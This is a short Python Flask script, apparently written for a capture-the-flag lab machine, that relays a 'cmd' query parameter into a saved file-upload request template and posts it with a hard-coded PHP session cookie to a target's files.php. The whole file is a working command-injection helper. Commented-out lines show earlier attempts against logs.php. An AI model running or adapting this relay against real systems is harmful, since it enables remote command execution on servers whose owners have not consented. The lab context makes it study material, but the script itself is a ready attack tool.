from flask import Flask
from flask import request
import requests

app = Flask(__name__)

@app.route('/')
def index():
    param=request.args.get('cmd');
    #d = { "delim": param }
    raw_data=open('file_upload_injection.req').read().replace('<MARKER>', param);
    cookies = {"PHPSESSID": "4c67s45dtunmuibvdco9baru7m" }
    #r = requests.post('http://localhost:4444/logs.php', data=d, cookies=cookies)
    headers= {"Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryLr4jpNj3NsHA0HBh" }
    r = requests.post('http://10.10.11.104/files.php', data=raw_data, headers=headers, cookies=cookies)
    #r = requests.post('http://10.10.11.104/logs.php', data=d, cookies=cookies)
    return r.text

app.run(host='0.0.0.0', port=80)
